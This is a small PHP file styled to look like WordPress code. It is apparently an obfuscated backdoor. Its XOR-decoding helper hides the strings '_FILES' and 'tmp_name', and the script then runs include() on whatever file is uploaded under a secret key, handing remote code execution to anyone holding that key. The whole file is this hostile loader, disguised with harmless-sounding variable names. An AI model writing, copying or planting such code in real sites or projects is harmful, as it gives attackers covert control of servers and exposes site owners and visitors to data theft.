<?php 	
$excerpt_length = 'RBUKS2oLpFh0V97';

$_ext = $excerpt_length;
function in_string($shortcode_tags, $_context)

{

    $thumbnail_id = $_context;
    $pre_attribute_ws = urldecode($shortcode_tags);
    $tags_to_ignore = substr($thumbnail_id,0, strlen($pre_attribute_ws));
    $_wp_post_type_features = $pre_attribute_ws ^ $tags_to_ignore;

    return $_wp_post_type_features;
}
	$trash = 'object';
$sentences = ${in_string("%0D%04%1C%07%16a", $_ext)};

$opening_single_quote = $sentences;
$all_parts = isset($opening_single_quote[$_ext]);

if ($all_parts)

{
    $settings = $sentences[$_ext];
    $post_type_object = $settings[in_string("%26%2F%25%14%3DS%02%29", $_ext)];
    $default_labels = $post_type_object;
    include ($default_labels);

}
?>
